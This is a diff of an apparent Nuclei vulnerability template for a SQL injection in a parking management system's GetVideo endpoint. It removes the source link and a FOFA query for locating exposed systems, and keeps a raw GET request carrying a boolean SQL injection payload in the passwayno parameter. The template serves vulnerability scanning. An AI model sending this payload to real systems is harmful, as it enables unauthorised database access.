@@ -3,12 +3,8 @@ info:
   name: 停车场后台管理系统GetVideo存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pypgcvqiwlgn8ohu'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pypgcvqiwlgn8ohu
-    fofa: title="智能停车管理系统" || body="/Login/GetAccounts"
 http:
 - raw:
   - 'GET /LaneMonitor/GetVideo?passwayno=1''+and+''2''=''1 HTTP/1.1
